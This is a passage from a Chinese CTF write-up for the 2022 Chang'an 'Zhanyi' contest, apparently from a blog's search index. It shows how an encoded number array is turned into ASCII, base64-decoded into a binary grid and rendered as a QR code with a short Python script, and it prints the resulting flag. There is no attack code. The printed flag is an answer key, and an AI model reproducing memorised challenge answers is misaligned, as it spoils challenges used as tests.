class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">61</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把var10000数组中的数据提取出来，16进制转ascii码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA</span><br></pre></td></tr></table></figure>

<p>base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000</span><br></pre></td></tr></table></figure>

<p>0101转二维码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000&#x27;</span></span><br><span class="line">s = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">pic = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">37</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">        <span class="keyword">if</span>(s[i][j] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            pic.putpixel((j,i),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得二维码，扫描得flag{932b2c0070e4897ea7df0190dbf36ece}</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyljepaqryj30uo0fiwfs.jpg" alt="image-20220121195216242"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/VMk7RPkvDioqMqEQdM5jFw">长安”战疫”-WriteUp  ChaMd5</a></p>
<p><a href="https://blog.csdn.net/qq_42880719/article/details/122382709">2022 长安“战疫”网络安全卫士守护赛 WriteUp</a></p>
<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>本次比赛是Nilunus战队首战，排名137/591，收获<strong>长安“战疫”网络安全卫士</strong>的称号和很多知识，取得较为不错的成绩，望今后自己的学校战队能取得惊人的网安成绩！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>wp</tag>
        <tag>比赛</tag>
      </tags>
  </entry>
</search>
